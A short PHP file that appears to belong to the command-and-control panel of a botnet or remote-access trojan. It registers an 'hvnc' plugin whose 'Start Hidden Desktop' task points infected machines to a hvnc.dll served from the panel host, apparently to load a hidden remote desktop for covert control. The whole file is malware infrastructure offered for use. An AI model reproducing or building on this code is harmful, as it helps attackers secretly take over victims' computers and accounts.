<?php


$pluginName = "hvnc";

$GLOBALS["foundPlugins"][$pluginName]["plugindir"] = __DIR__;

$host = "http://".$_SERVER["HTTP_HOST"];

$GLOBALS["task_configuration"][$pluginName] = array(
    "name" => "Start Hidden Desktop",
    "command" => "runplugin",
    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/dll/hvnc.dll;hvnc;127.0.0.1"
);